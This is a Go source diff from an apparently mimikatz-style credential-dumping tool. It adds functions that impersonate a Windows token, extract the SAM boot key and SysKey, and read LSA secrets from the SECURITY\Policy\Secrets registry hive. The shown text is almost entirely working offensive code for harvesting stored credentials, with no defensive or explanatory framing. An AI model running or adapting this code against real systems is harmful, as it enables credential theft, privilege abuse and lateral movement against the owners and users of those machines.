@@ -1,11 +1,18 @@
 package modules
+
 import (
+	"encoding/hex"
+	"fmt"
+	"io"
 	"katz/katz/modules/sam"
 	"katz/katz/utils"
+
 	"golang.org/x/sys/windows"
 	"golang.org/x/sys/windows/registry"
-	"fmt"
 )
+type printableSecret interface {
+	PrintSecret(io.Writer)
+}
 
 
 func DumpSAM(token windows.Token) ([]*sam.Sam_account, error){
@@ -71,26 +78,41 @@ func DumpSAM(token windows.Token) ([]*sam.Sam_account, error){
 	return acc, nil
 
 }
+func GetSysKey(token windows.Token) (result string, err error){
+	err = utils.InjectToken(token)
+	if err != nil {
+		return 
+	}
+	bootKey, err := sam.GetBootKey(token)
+	sysKey, err := sam.GetSysKey(token, bootKey)
+	result = fmt.Sprintf("0x%s",hex.EncodeToString(sysKey))
+	return
+}
+func GetBootKey(token windows.Token, toStr bool) (result interface{}, err error) {
+	err = utils.InjectToken(token)
+	if err != nil {
+		return 
+	}
+	bootKey, err := sam.GetBootKey(token)
+	if toStr {
+	result = fmt.Sprintf("0x%s",hex.EncodeToString(bootKey))
+	}
+	return
+}
+func DumpLSASecrets(token windows.Token, bootkey []byte, VistaStyle bool, history bool) (result []*sam.PrintableLSASecret, err error){
 
-
-// func DumpLSASecrets(token windows.Token){
-// 	keys := []string{
-// 		`SECURITY\Policy\Secrets`,
-// 		`SECURITY\Policy\Secrets\NL$KM`,
-// 		`SECURITY\Policy\Secrets\NL$KM\CurrVal`,
-// 		`SECURITY\Policy\PolEKList`,
-// 		`SECURITY\Policy\PolSecretEncryptionKey`,
-// 	}
-// }
-
-// func DumpDCC2Cache(token windows.Token){
-// 	keys := []string{
-// 		`SECURITY\Policy\Secrets`,
-// 		`SECURITY\Policy\Secrets\NL$KM`,
-// 		`SECURITY\Policy\Secrets\NL$KM\CurrVal`,
-// 		`SECURITY\Policy\PolEKList`,
-// 		`SECURITY\Policy\PolSecretEncryptionKey`,
-// 		`SECURITY\Cache`,
-// 	}
-
-// }
+	keySecrets := `SECURITY\Policy\Secrets`
+	var secrets []string
+	regkey, err := registry.OpenKey(registry.LOCAL_MACHINE, keySecrets, registry.READ)
+	secrets, _ = regkey.ReadSubKeyNames(-1)
+	newsecrets := make([]string, 0, len(secrets)*2)
+	for i := range secrets {
+		newsecrets = append(newsecrets, fmt.Sprintf("%s\\%s", keySecrets, secrets[i]))
+		newsecrets = append(newsecrets, fmt.Sprintf("%s\\%s\\%s", keySecrets, secrets[i], "CurrVal"))
+	}
+	lsaSecrets, err := sam.GetLSASecrets(token, bootkey, VistaStyle, history)
+	for i := range lsaSecrets{
+		result = append(result, &lsaSecrets[i])
+	}
+	return result, err
+}
